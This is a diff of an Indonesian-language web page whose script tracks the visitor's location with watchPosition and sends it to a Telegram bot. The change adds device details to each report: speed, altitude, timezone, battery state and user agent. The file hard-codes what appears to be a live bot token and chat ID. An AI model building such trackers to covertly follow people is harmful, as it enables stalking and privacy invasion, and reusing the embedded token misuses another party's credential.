@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { font-family: sans-serif; padding: 20px; background: #f2f2f2; }
-    #status { margin-top: 20px; padding: 15px; background: white; border-radius: 10px; box-shadow: 0 0 5px rgba(0,0,0,0.1); white-space: pre-line; }
+    #status { margin-top: 20px; padding: 15px; background: white; border-radius: 10px; box-shadow: 0 0 5px rgba(0,0,0,0.1); }
   </style>
 </head>
 <body>
@@ -16,36 +16,75 @@
   <script>
     const TOKEN = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
     const chatId = "5677912817";
-    const userId = "Uta001"; // Ganti sesuai nama pengguna jika perlu
+    const userId = "Uta001";
 
     let lastSent = 0;
-    const interval = 300000; // 5 menit dalam milidetik
+    const interval = 300000; // 5 menit
 
-    function kirimLokasi(pos) {
+    async function getBatteryInfo() {
+      try {
+        const battery = await navigator.getBattery();
+        return `Battery: ${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Not Charging"})`;
+      } catch {
+        return "Battery: Unknown";
+      }
+    }
+
+    function kirimInfo(pos) {
       const now = Date.now();
       if (now - lastSent < interval) return;
 
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
-      const caption = `[ID: ${userId}]\nLokasi dikirim: ${lat}, ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;
-      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(caption)}`;
+      const speed = pos.coords.speed ?? "Unknown";
+      const heading = pos.coords.heading ?? "Unknown";
+      const altitude = pos.coords.altitude ?? "Unknown";
+      const accuracy = pos.coords.accuracy;
 
-      fetch(url)
-        .then(() => {
-          document.getElementById("status").innerText = caption;
-          lastSent = now;
-        })
-        .catch(() => {
-          document.getElementById("status").innerText = "Gagal mengirim lokasi.";
-        });
+      const language = navigator.language || "Unknown";
+      const userAgent = navigator.userAgent;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const timeLocal = new Date().toLocaleString();
+      const timeUTC = new Date().toUTCString();
+
+      getBatteryInfo().then(batteryInfo => {
+        const pesan = `
+[ID: ${userId}]
+Lokasi dikirim: ${lat}, ${lon}
+https://maps.google.com/?q=${lat},${lon}
+
+Speed: ${speed}
+Heading: ${heading}
+Altitude: ${altitude}
+Accuracy: ${accuracy}m
+
+Lang: ${language}
+TZ: ${timezone}
+Local: ${timeLocal}
+UTC: ${timeUTC}
+
+${batteryInfo}
+Device: ${userAgent}`.trim();
+
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`;
+
+        fetch(url)
+          .then(() => {
+            document.getElementById("status").innerText = pesan;
+            lastSent = now;
+          })
+          .catch(() => {
+            document.getElementById("status").innerText = "Gagal mengirim lokasi.";
+          });
+      });
     }
 
     function gagalAmbilLokasi(err) {
-      document.getElementById("status").innerText = "Gagal mendapatkan lokasi. Pastikan izin lokasi aktif.";
+      document.getElementById("status").innerText = "Gagal mendapatkan lokasi. Pastikan izin diberikan.";
     }
 
     if ("geolocation" in navigator) {
-      navigator.geolocation.watchPosition(kirimLokasi, gagalAmbilLokasi, {
+      navigator.geolocation.watchPosition(kirimInfo, gagalAmbilLokasi, {
         enableHighAccuracy: true,
         maximumAge: 10000,
         timeout: 10000
